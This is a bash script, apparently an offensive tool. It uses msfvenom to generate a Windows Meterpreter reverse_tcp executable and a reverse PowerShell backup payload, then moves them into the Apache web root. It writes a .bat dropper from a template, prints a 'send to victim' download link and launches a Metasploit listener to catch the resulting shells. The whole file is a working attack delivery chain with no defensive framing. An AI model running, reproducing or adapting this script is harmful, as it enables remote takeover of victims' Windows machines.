#!/bin/bash

# Function to display the banner
display_banner() {
    echo "calling banner..."
    sleep 0.5
    cat logo.txt
    echo ""
    echo ""
}

# Function to create a payload
create_payload() {
    local lhost=$1
    local lport=$2
    local name=$3
    local payload_type=$4

    echo "Generating $payload_type payload..."
    msfvenom -p $payload_type lhost=$lhost lport=$lport -f exe > $name.exe
    if [ $? -ne 0 ]; then
        echo "Error: Failed to create payload $name.exe"
        exit 1
    fi
}

# Function to create a backup payload
create_backup_payload() {
    local lhost=$1
    local lport=$2
    local backup=$3

    echo "Generating backup payload..."
    msfvenom -p cmd/windows/reverse_powershell lhost=$lhost lport=$lport > $backup.sh
    if [ $? -ne 0 ]; then
        echo "Error: Failed to create backup payload $backup.sh"
        exit 1
    fi
}

# Function to handle Apache server
handle_apache() {
    echo "Starting Apache server..."
    sudo systemctl start apache2
    sudo systemctl restart apache2.service
}

# Function to move files to web server directory
move_files() {
    local name=$1
    local backup=$2

    mv /var/www/html/index.html /var/www/
    mv $name.exe /var/www/html/
    mv $backup.sh /var/www/html/
}

# Function to create payload batch file
create_payload_batch() {
    local lhost=$1
    local name=$2
    local backup=$3
    local payload=$4

    sed -e "s/\$ip/$lhost/" -e "s/\$name/$name/" -e "s/\$lhost/$lhost/" -e "s/\$backup/$backup/" requirements.txt > $payload.bat
    sudo mv $payload.bat /var/www/html/
}

# Function to start Metasploit
start_metasploit() {
    local lhost=$1
    local name=$2

    sed -e "s/\$lhost/$lhost/" meterpreter.rc > $name.rc
 msfconsole -r $name.rc
}

# Main function
main() {
    display_banner

    read -p "Enter Port [Example: 4444]: " port
    read -p "Enter the Lhost: " lhost
    read -p "Enter the Payload Name: " name
    read -p "Enter the Backup Payload Name: " backup
    read -p "Enter One More Different Payload Name: " payload

    create_payload $lhost $port $name "windows/meterpreter/reverse_tcp"
    create_backup_payload $lhost $port $backup
    handle_apache
    move_files $name $backup
    create_payload_batch $lhost $name $backup $payload
    echo "Payload link (send to victim): http://$lhost/$payload.bat"
    start_metasploit $lhost $name
}

main
